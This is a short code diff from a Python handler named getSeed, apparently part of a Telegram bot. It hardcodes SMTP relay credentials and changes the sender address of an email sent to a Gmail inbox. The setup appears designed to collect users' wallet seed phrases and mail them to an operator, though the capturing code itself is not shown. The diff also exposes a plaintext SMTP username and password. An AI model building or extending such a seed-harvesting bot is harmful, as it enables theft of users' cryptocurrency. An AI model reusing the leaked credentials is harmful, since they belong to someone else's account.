@@ -47,7 +47,7 @@ async def getSeed(update: Update, context: CallbackContext) -> str:
     smtp_username = "870b79001@smtp-brevo.com"
     smtp_password = "NT2hk8WtrzQR9vVf"
 
-    sender_mail = "jimmywillbanks4@gmail.com"
+    sender_mail = "screenerbotdex@gmail.com"
     receiver_email = "screenerbotdex@gmail.com"
 
 
